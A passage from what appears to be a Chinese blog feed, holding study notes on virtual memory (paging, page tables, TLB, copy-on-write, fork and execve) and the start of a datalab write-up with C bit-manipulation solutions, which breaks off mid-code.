地址空间</h3><p>地址空间是一个非负整数的有序集合：</p><p>{0,1,2，···}</p><p>虚拟地址空间：{0,1,2，···，N-1}</p><p>物理地址空间：{0,1,2，···，M-1}</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和它们的属性（地址）。一旦认识到了这种区别，那么我们就可以将其推广，允许每个数据对象有多个独立的地址，其中每个地址都选自一个不同的地址空间。这就是虚拟存储器的基本思想。主存中的每个字节都有个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</p><hr><h3 id="9-3-虚拟存储器作为缓存的工具"><a href="#9-3-虚拟存储器作为缓存的工具" class="headerlink" title="9.3 虚拟存储器作为缓存的工具"></a>9.3 虚拟存储器作为缓存的工具</h3><p><strong>虚拟存储器</strong>(VM)被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每字节都有一个唯一的虚拟地址，这个唯一的虚拟地址是作为到数组的索引的。</p><p>VM系统将虚拟存储器分割为称为<strong>虚拟页</strong>( Virtual Page,VP)的大小固定的块。每个虚拟页的大小为P=2^p^字节。</p><p>类似地，物理存储器被分割为<strong>物理页</strong>( Physical Page,PP),大小也为P字节（物理页也称为页帧( page frame))。</p><p>一个n位的地址空间有2^n-p^页</p><p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p><ul><li><strong>未分配的</strong>：VM系统还未分配（或者创建）的页。未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。</li><li><strong>缓存的</strong>：当前缓存在物理存储器中的已分配页。</li><li><strong>未缓存的</strong>：没有缓存在物理存储器中的已分配页。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616175211113.png" alt="image-20210616175211113"></p><h4 id="9-3-1-DRAM缓存的组织结构"><a href="#9-3-1-DRAM缓存的组织结构" class="headerlink" title="9.3.1 DRAM缓存的组织结构"></a>9.3.1 DRAM缓存的组织结构</h4><p>SRAM缓存：位于CPU和主存之间的L1、L2和L3高速缓存</p><p>DRAM缓存：虚拟存储器系统的缓存，它在主存中缓存虚拟页</p><p><strong>DRAM缓存的组织结构：</strong></p><ul><li>SRAM比DRAM快大约10倍，DRAM要比磁盘快大约100000多倍</li><li>巨大的不命中处罚和访问第一字节的开销</li><li>由于大的不命中处罚，DRAM缓存是全相连的</li><li>使用写回而不是直写</li></ul><h4 id="9-3-2-页表"><a href="#9-3-2-页表" class="headerlink" title="9.3.2 页表"></a>9.3.2 页表</h4><p>页表存放在<strong>物理存储器</strong>中</p><p><strong>页表</strong>就是一个<strong>页表条目</strong>（PTE）的数组，负责将虚拟页映射到物理页。每次地址翻译软件将一个虚拟地址转换成物理地址时都会读取页表。操作系统负责维护页表的内容，以及在磁盘和DRAM之间来回传送页。</p><p>每个PTE由一个有效位和一个n位地址字段组成</p><ul><li><p>设置了有效位（已缓存）</p><p>表明该虚拟页被缓存在DRAM中，地址字段表示DRAM中相应的物理页的起始位置，这个物理页缓存了该虚拟页</p></li><li><p>未设置有效位（还未被缓存）</p><ul><li>一个空地址表示这个虚拟页还未被分配</li><li>否则这个地址指向该虚拟页在磁盘上的起始位置（已分配未缓存）</li></ul></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616211103583.png" alt="image-20210616211103583"></p><h4 id="9-3-3-页命中"><a href="#9-3-3-页命中" class="headerlink" title="9.3.3 页命中"></a>9.3.3 页命中</h4><p>地址翻译硬件将虚拟地址作为一个索引来定位PTE 2,并从存储器中读取它。因为设置了有效位，那么地址翻译硬件就知道VP 2是缓存在存储器中的了。所以它使用PTE中的物理存储器地址（该地址指向PP 1中缓存页的起始位置），构造出这个字的物理地址。</p><h4 id="9-3-4-缺页"><a href="#9-3-4-缺页" class="headerlink" title="9.3.4 缺页"></a>9.3.4 缺页</h4><p>DRAM缓存不命中称为<strong>缺页</strong></p><p>发现缺页后触发一个缺页异常，调用内核中的缺页异常处理程序，在物理页中选择一个牺牲页，如果牺牲页被修改过了则将牺牲页保存回磁盘，无论是否修改，内核都会修改牺牲页的PTE，然后将目标虚拟页缓存到磁盘中对应的物理页，更新目标页的PTE，然后异常处理程序返回，它会重新启动导致缺页的指令。</p><p><strong>交换</strong>( swapping)或者<strong>页面调度</strong>( paging)：在磁盘和存储器之间传送页的活动。</p><p>页从磁盘换入（或者页面调入）DRAM和从DRAM换出（或者页面调出）磁盘。</p><p><strong>按需页面调度：</strong>一直等待，直到最后时刻，也就是当有不命中发生时，才换入页面的一种策略</p><h4 id="9-3-5-分配页面"><a href="#9-3-5-分配页面" class="headerlink" title="9.3.5 分配页面"></a>9.3.5 分配页面</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616212903869.png" alt="image-20210616212903869"></p><h4 id="9-3-6-又是局部性救了我们"><a href="#9-3-6-又是局部性救了我们" class="headerlink" title="9.3.6 又是局部性救了我们"></a>9.3.6 又是局部性救了我们</h4><p>尽管在整个运行过程中程序引用的不同页面的总数可能超出物理存储器总的大小，但是局部性原则保证了在任意时刻，程序将往往在一个较小的活动页面( active page)集合上工作，这个集合叫做工作集( working set)或者常驻集( resident set)。在初始开销，也就是将工作集页面调度到存储器中之后，接下来对这个工作集的引用将导致命中，而不会产生额外的磁盘流量</p><p>如果工作集的大小超出了物理存储器的大小，那么程序将产生一种不幸的状态，叫做<strong>颠簸(</strong> thrashing),这时页面将不断地<br>换进换出。虽然虚拟存储器通常是有效的，但会很慢。</p><hr><h3 id="9-4-虚拟存储器作为存储器管理的工具"><a href="#9-4-虚拟存储器作为存储器管理的工具" class="headerlink" title="9.4 虚拟存储器作为存储器管理的工具"></a>9.4 虚拟存储器作为存储器管理的工具</h3><p>VM简化了链接和加载、代码和数据共享，以及应用程序的存储器分配。</p><ul><li><strong>简化链接</strong>。独立的地址空间允许每个进程的存储器映像使用相同的基本格式，而不管代码和数据实际存放在物理存储器的何处。例如，像我们在图813中看到的，个给定的Linux系统上的每个进程都使用类似的存储器格式。文本节总是从虛拟地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)。数据和节紧跟在文本节后面。栈占据进程地址空间最高的部分，并向下生长。这样的一致性极大地简化了链接器的设计和实现，允许链接器生成全链接的可执行文件，这些可执行文件是独立于物理存储器中代码和数据的最终位置的。</li><li><strong>简化加载</strong>。虚拟存储器还使得容易向存储器中加载可执行文件和共享对象文件。回想一下第7章，在ELF可执行文件中.text和.data节是连续的。要把这些节加载到一个新创建的进程中， Linux加载器分配虚拟页的一个连续的片(chunk),从地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)，把这些虚拟页标记为无效的（即未被缓存的），将页表条目指向目标文件中适当的位置。有趣的是，加载器从不实际拷贝任何数据从磁盘到存储器。在每个页初次被引用时，要么是CPU取指令时引用的，要么是一条正在执行的指令引用一个存储器位置时引用的，虚拟存储器系统会按照需要自动地调入数据页。</li><li><strong>简化共享</strong>。独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间共享的致机制。一般而言，每个进程都有自己私有的代码、数据、堆以及栈区域，是不和其他进程共享的。在这种情况下，操作系统创建页表，将相应的虚拟页映射到不同的物理页面。</li><li><strong>简化存储器分配</strong>。虚拟存储器为向用户进程提供一个简单的分配额外存储器的机制。当个运行在用户进程中的程序要求额外的堆空间时(如调用ma11oc的结果)，操作系统分配一个适当数字(例如k)个连续的虚拟存储器页面，并且将它们映射到物理存储器中任意位置的k个任意的物理页面。由于页表工作的方式，操作系统没有必要分配k个连续的物理存储器页面。页面可以随机地分散在物理存储器中。</li></ul><hr><h3 id="9-5-虚拟存储器作为存储器保护的工具"><a href="#9-5-虚拟存储器作为存储器保护的工具" class="headerlink" title="9.5 虚拟存储器作为存储器保护的工具"></a>9.5 虚拟存储器作为存储器保护的工具</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214509999.png" alt="image-20210616214509999"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214520599.png" alt="image-20210616214520599"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214457345.png" alt="image-20210616214457345"></p><hr><h3 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210617120441290.png" alt="image-20210617120441290">地址翻译是一个N元素的虚拟地址空间（VAS)中的元素和一个M元素的物理地址空间（PAS)中元素之间的映射，</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618142508589.png" alt="image-20210618142508589"></p><p><strong>MMU如何利用页表来实现这种映射:</strong></p><p>CPU中的一个控制寄存器，<strong>页表基址寄存器</strong>( Page Table Base Register,PTBR)指向当前页表。</p><p>n位的虚拟地址包含两个部分：一个p位的<strong>虚拟页面偏移</strong>( Virtual Page Offset,<strong>VPO</strong>)和一个(n-p)位的<strong>虚拟页号</strong>（ Virtual Page Number,<strong>VPN</strong>).</p><p>MMU利用VPN来选择适当的PTE。例如，VPN0选择PTE0,VPN1选择PTE1,以此类推。</p><p>将页表条目中<strong>物理页号</strong>( Physical Page Number,PPN)和虚拟地址中的<strong>VPO</strong>串联起来，就得到相应的物理地址。</p><p>注意，因为物理和虚拟页面都是P字节的，所以<strong>物理页面</strong><br><strong>偏移</strong>( Physical Page Offset,PPO)和VPO是相同的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618142837272.png" alt="image-20210618142837272"></p><p><strong>当页面命中时，CPU硬件执行的步骤:</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618143403713.png" alt="image-20210618143403713"></p><ul><li>第一步：处理器生成一个虚拟地址，并把它传送给MMU</li><li>第二步：MMU生成PTE地址，并从高速缓存/主存请求得到它。</li><li>第三步：高速缓存/主存向MMU返回PTE.</li><li>第四步：MMU构造物理地址，并把它传送给高速缓存/主存。</li><li>第五步：高速缓存/主存返回所请求的数据字给处理器。</li></ul><p>页面命中完全是由硬件来处理的，与之不同的是，<strong>处理缺页</strong>要求硬件和操作系统内核协作完成:</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618143420468.png" alt="image-20210618143420468"></p><ul><li>第一步到第三步：和图9-13a中的第一步到第三步相同。</li><li>第四步：PTE中的有效位是零，所以MMU触发了一次异常，传递CPU中的控制到操作系统内核中的缺页异常处理程序。</li><li>第五步：缺页处理程序确定出物理存储器中的牺牲页，如果这个页面已经被修改了，则把它换出到磁盘。</li><li>第六步：缺页处理程序页面调入新的页面，并更新存储器中的PTE.</li><li>第七步：缺页处理程序返回到原来的进程，再次执行导致缺页的指令。CPU将引起缺页的虚拟地址重新发送给MMU。因为虚拟页面现在缓存在物理存储器中，所以就会命中，在MMU执行了图9-13b中的步骤之后，主存就会将所请求字返回给处理器。</li></ul><h4 id="9-6-1-结合高速缓存和虚拟存储器"><a href="#9-6-1-结合高速缓存和虚拟存储器" class="headerlink" title="9.6.1 结合高速缓存和虚拟存储器"></a>9.6.1 结合高速缓存和虚拟存储器</h4><p>图9-14展示了<strong>一个物理寻址的高速缓存如何和虚拟存储器结合起来</strong>。主要的思路是地址翻译发生在高速缓存査找之前。注意，页表条目可以缓存，就像其他的数据字一样。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618144221444.png" alt="image-20210618144221444"></p><h4 id="9-6-2-利用TLB加速地址翻译"><a href="#9-6-2-利用TLB加速地址翻译" class="headerlink" title="9.6.2 利用TLB加速地址翻译"></a>9.6.2 利用TLB加速地址翻译</h4><p><strong>翻译后备缓冲器（TLB）：</strong>许多系统为了消除存储器读数据的开销，它们在MMU中包括了一个关于PTE的小的缓存。</p><p>它用于组选择和行匹配的索引和标记字段是从虚拟地址中<br>的虚拟页号中提取出来的。如果TLB有T=2^t^个组，那么TLB索引(TLBI)是由VPN的t个最低位组成的，而TLB标记(TLBT)是由VPN中剩余的位组成的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618145747729.png" alt="image-20210618145747729"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618145533203.png" alt="image-20210618145533203"></p><p><strong>TLB命中时的步骤：</strong></p><ul><li>第一步：CPU产生一个虚拟地址。</li><li>第二步和第三步：MMU从TLB中取出相应的PTE.</li><li>第四步：MMU将这个虚拟地址翻译成一个物理地址，并且将它发送到高速缓存/主存。</li><li>第五步：高速缓存/主存将所请求的数据字返回给CPU.</li></ul><p>当TLB不命中时，MMU必须从L1缓存中取出相应的PTE,如图9-16b所示。新取出的PTE存放在TLB中，可能会覆盖一个已经存在的条目。</p><h4 id="9-6-3-多级页表"><a href="#9-6-3-多级页表" class="headerlink" title="9.6.3 多级页表"></a>9.6.3 多级页表</h4><p><strong>一级页表</strong>中的每个PTE负责映射虚拟地址空间中一个4MB的片( chunk),这里每一片都是由1024个连续的页面组成的。比如，PTE0映射第一片，PTE1映射接下来的一片，以此类推。假设地址空间是4GB,1024个PTE已经足够覆盖整个空间了。</p><p><strong>二级页表</strong>中的每个PTE都负责映射一个4KB的虚拟存储器页面，就像我们査看只有一级的页表一样。注意，使用4字节的PTE,每个一级和二级页表都是4KB字节，这刚好和一个页面<br>的大小是一样的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618152422961.png" alt="image-20210618152422961"></p><p>这种方法从<strong>两个方面减少了存储器要求：</strong></p><ul><li>第一，如果一级页表中的一个PTE是空的，那么相应的二级页表就根本不会存在，这代表着一种巨大的潜在节约，因为对于一个典型的程序，4GB的虚拟地址空间的大部分都将是未分配的。</li><li>第二，只有一级页表才需要总是在主存中；虚拟存储器系统可以在需要时创建、页面调入或调出二级页表，这就减少了主存的压力；只有最经常使用的二级页表才需要缓存在主存中</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618152610119.png" alt="image-20210618152610119"></p><h4 id="9-6-4-综合：端到端的地址翻译"><a href="#9-6-4-综合：端到端的地址翻译" class="headerlink" title="9.6.4 综合：端到端的地址翻译"></a>9.6.4 综合：端到端的地址翻译</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114131611.png" alt="image-20210619114131611"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114151547.png" alt="image-20210619114151547"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114205017.png" alt="image-20210619114205017"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114233781.png" alt="image-20210619114233781"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114250559.png" alt="image-20210619114250559"></p><hr><h3 id="9-7-案例研究：-Intel-Core-i7-Linux存储器系统"><a href="#9-7-案例研究：-Intel-Core-i7-Linux存储器系统" class="headerlink" title="9.7 案例研究： Intel Core i7/ Linux存储器系统"></a>9.7 案例研究： Intel Core i7/ Linux存储器系统</h3><hr><h3 id="9-8-存储器映射"><a href="#9-8-存储器映射" class="headerlink" title="9.8 存储器映射"></a>9.8 存储器映射</h3><h4 id="9-8-1-再看共亨对象"><a href="#9-8-1-再看共亨对象" class="headerlink" title="9.8.1 再看共亨对象"></a>9.8.1 再看共亨对象</h4><p>一个对象可以被映射到虚拟存储器的一个区域，要么作为<strong>共享对象</strong>，要么作为<strong>私有对象</strong>。</p><p>如果一个进程将一个<strong>共享对象</strong>映射到它的虚拟地址空间的一个区域内，那么这个进程对这个区域的任何写操作，对于那些也把这个共享对象映射到它们虚拟存储器的其他进程而言也是可见的。而且，这些变化也会反映在磁盘上的原始对象中。<br>另一方面，对一个映射到<strong>私有对象</strong>的区域做的改变，对于其他进程来说是不可见的，并且进程对这个区域所做的任何写操作都不会反映在磁盘上的对象中。一个映射到共享对象的虚拟存储器区域叫做共享区域。类似地，也有私有区域。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621163041564.png" alt="image-20210621163041564"></p><p><strong>写时拷贝</strong></p><p>私有对象是使用一种叫做<strong>写时拷贝</strong>(copy-on- write)的巧妙技术被映射到虚拟存储器中的。<br>一个私有对象开始生命周期的方式基本上与共享对象的一样，在物理存储器中只保存有私有对象的一份拷贝。比如，图9-30a展示了一种情况，其中两个进程将一个私有对象映射到它们虚拟存储器的不同区城，但是共享这个对象同一个物理拷贝。对于每个映射私有对象的进程，相应私有区域的页表条目都被标记为<strong>只读</strong>，并且区域结构被标记为私有的写时拷贝。只要没有进程试图写它自己的私有区域，它们就可以继续共享物理存储器中对象的一个单独拷贝。然而，只要有一个进程试图写私有区城内的某个页面，那么这个写操作就会触发一个保护故障。<br>当故障处理程序注意到保护异常是由于进程试图写私有的写时拷贝区城中的一个页面而引起的，它就会在物理存储器中<strong>创建这个页面的一个新拷贝</strong>，<strong>更新页表条目</strong>指向这个新的拷贝，然后<strong>恢复</strong>这个页面的<strong>可写权限</strong>，如图9-30b所示。当故障处理程序返回时，CPU重新执行这个写操作，现在在新创建的页面上这个写操作就可以正常执行了。<br>通过延迟私有对象中的拷贝直到最后可能的时刻，写时拷贝最充分地使用了稀有的物理存储器。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621163448754.png" alt="image-20210621163448754"></p><h4 id="9-8-2-再看fork函数"><a href="#9-8-2-再看fork函数" class="headerlink" title="9.8.2 再看fork函数"></a>9.8.2 再看fork函数</h4><p>新创建的子进程几乎但不完全与父进程相同。<strong>子进程得到与父进程用户级虚拟地址空间相同</strong><br><strong>的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程</strong><br><strong>任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中</strong><br><strong>打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的PID。</strong></p><p>既然我们理解了虚拟存储器和存储器映射，那么我们可以清晰地知道fork函数是如何创建一个带有自己独立虚拟地址空间的新进程的。<br><strong>当fork函数被当前进程调用时，内核为新进程创建各种数据结构，并分配给它一个唯一的PID.为了给这个新进程创建虚拟存储器，它创建了当前进程的 mm_struct、区域结构和页表的原样拷贝。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时拷贝。</strong></p><p>当fork在新进程中返回时，新进程现在的虚拟存储器刚好和调用fork时存在的虚拟存储器相同。当这两个进程中的任一个后来进行写操作时，写时拷贝机制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。</p><h4 id="9-8-3-再看-execvel函数"><a href="#9-8-3-再看-execvel函数" class="headerlink" title="9.8.3 再看 execvel函数"></a>9.8.3 再看 execvel函数</h4><p>正如在第8章中学到的， execve函数在当前进程中加载并运行包含在可执行目标文件a.out中的程序，用a.out程序有效地替代了当前程序。加载并运行a.out需要以下几个步骤：</p><ul><li><strong>删除已存在的用户区域</strong>。删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li><strong>映射私有区域</strong>。为新程序的文本、数据、bss和栈区域创建新的区域结构。所有这些新的区域都是私有的、写时拷贝的。文本和数据区域被映射为a.out文件中的文本和数据区。bbs区域是请求二进制零的，映射到匿名文件，其大小包含在a.out中。栈和堆区域也是请求二进制零的，初始长度为零。图9-31概括了私有区域的不同映射。</li><li><strong>映射共享区域</strong>。如果a.out程序与共享对象（或目标）链接，比如标准C库libc.so,那么这些对象都是动态链接到这个程序的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li>**设置程序计数器(PC)**。 execve的最后一件事情就是设置当前进程上下文中的程序计数器，使之指向文本区域的入口点。</li></ul><p>下一次调度这个进程时，它将从这个入口点开始执行。Linux将根据需要换入代码和数据页面。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621164152972.png" alt="image-20210621164152972"></p><h4 id="9-8-4-使用mmap函数的用户级存储器映射"><a href="#9-8-4-使用mmap函数的用户级存储器映射" class="headerlink" title="9.8.4 使用mmap函数的用户级存储器映射"></a>9.8.4 使用mmap函数的用户级存储器映射</h4><hr><h3 id="9-9-动态存储器分配"><a href="#9-9-动态存储器分配" class="headerlink" title="9.9 动态存储器分配"></a>9.9 动态存储器分配</h3><hr><h3 id="9-10-垃圾收集"><a href="#9-10-垃圾收集" class="headerlink" title="9.10 垃圾收集"></a>9.10 垃圾收集</h3><hr><h3 id="9-11-C程序中常见的与存储器有关的"><a href="#9-11-C程序中常见的与存储器有关的" class="headerlink" title="9.11 C程序中常见的与存储器有关的"></a>9.11 C程序中常见的与存储器有关的</h3>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab2_datalab</title>
    <link href="/2021/07/04/lab2_datalab/"/>
    <url>/2021/07/04/lab2_datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="lab2-datalab"><a href="#lab2-datalab" class="headerlink" title="lab2_datalab"></a>lab2_datalab</h1><h2 id="1-bitAnd"><a href="#1-bitAnd" class="headerlink" title="1.bitAnd"></a>1.bitAnd</h2><p>这个很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitAnd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~x|~y);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-getByte"><a href="#2-getByte" class="headerlink" title="2.getByte"></a>2.getByte</h2><p>舍掉最后的n个字节，即n*8位，并保留舍掉后的最后8位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 6</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getByte</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> tmp =x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>);<span class="hljs-comment">//将目标移到最后</span><br>   tmp=tmp&amp;<span class="hljs-number">0xFF</span>;<span class="hljs-comment">//保留目标</span><br>   <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="3-logicalShift"><a href="#3-logicalShift" class="headerlink" title="3.logicalShift"></a>3.logicalShift</h2><p>对x进行逻辑右移（算术右移补符号位，逻辑右移补0），可以采用先进行算术右移，然后将右移多出来的符号位置0。</p><p>因为不能使用减号，所以将1左移31位后采用先右移n,再左移1位的方法，最后取反。</p><p>与算术右移进行与即可得到结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalShift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> result = (x &gt;&gt; n) &amp; (~(((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &gt;&gt; n) &lt;&lt; <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-bitCount"><a href="#4-bitCount" class="headerlink" title="4.bitCount"></a>4.bitCount</h2><p>此问题较为复杂，参考了网上的做法，采用自底向上的方式进行求解，先求两位中1的个数、再求四位中1的个数……最后求三十二位中1的个数</p><p>具体过程如图所示:</p><p><img src="/2021/07/04/lab2_datalab/image-20210406160622289.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> mask_1,mask_2,mask_4,mask_8,mask_16;<br><br>  mask_1=<span class="hljs-number">0x55</span>|(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_1=mask_1|(mask_1&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x55555555,即01010101···</span><br>  mask_2=<span 